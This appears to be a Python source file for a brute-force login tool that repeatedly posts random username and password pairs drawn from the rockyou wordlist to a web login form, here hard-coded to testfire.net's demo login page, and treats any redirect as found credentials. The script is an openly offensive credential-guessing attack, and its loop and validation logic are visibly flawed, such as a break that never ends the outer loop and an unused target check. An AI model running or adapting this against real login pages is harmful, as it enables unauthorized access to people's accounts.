import logging
import requests
import sys
from datetime import datetime
from colorama import Fore, init
from wordlist import rockyou
import os
from random import choice, randint
import re

init()

# TODO: correct the headers name error

class Brute:
    def __init__(self, count, sliced, target=None):
        self.count = count
        self.target = target
        self.chlwr = [chr(ord('A') + i) for i in range(26)]
        self.chlup = [chr(ord('a') + i) for i in range(26)]
        self.logfile = f"SQLJ{choice(self.chlwr)}.log"
        logging.basicConfig(filename=self.logfile, level=logging.DEBUG)
        logging.info(f"Log file created with name: {self.logfile}")
        self.sliced = sliced
        self.word = list(rockyou(count=10000000))

    def target_selection_syn(self):
        try:
            if self.target is None:
                raise ValueError

            req = requests.get(self.target)
            assert req.status_code == 200

        except ValueError:
            print(Fore.RED + "[ERROR] Please enter the target URL")
            logging.error('invalid url(None url)')
            return False

        except AssertionError:
            print(Fore.RED + "Your URL is not valid")
            logging.error(f"target:{self.target} is not valid, time:{datetime.now()}")

        return self.target

    def bruteforce_sqlj(self):
        try:
            while True:
                for i in range(self.count):
                    logging.info(f"Attempt {i + 1} of {self.count}")
                    payload = {
                        "username": choice(self.word),
                        "password": choice(self.word)
                    }
                    req = requests.post(self.target, data=payload)
                    
                    # Use regular expression to check if the response code is 302
                    if re.match(r'^3\d{2}$', str(req.status_code)):
                        print(f"Found username:{payload['username']}")
                        print(f"Found password: {payload['password']}")
                        logging.info(f"Found password: {payload['password']}")
                        break

                    # Use string formatting to insert variable values
                    line = f"Testing payload: username={payload['username']}, password={payload['password']}\nstatus code:{req.status_code}"

                    # Clear the console
                    os.system('cls' if os.name == 'nt' else 'clear')

                    # Print the updated line
                    print(line)
                    row_line = " ".join(str(randint(0, 1)) for _ in range(4))
                    print(f"""
                                        {row_line}   {row_line}  {row_line}  
                                        {row_line}   {row_line}  {row_line}  
                                        {row_line}   {row_line}  {row_line}  
                                        
                                        
                                        
                                        
                                        
                              """)

        except KeyboardInterrupt:
            print("Aborted")
            

def run_brute_force():

    obj = Brute(10000000000000, target="http://testfire.net/login.jsp", sliced=10000)
    sliced_generator = obj.word
    sliced_list = list(sliced_generator)
    obj.count = len(sliced_list)
    obj.bruteforce_sqlj()

run_brute_force()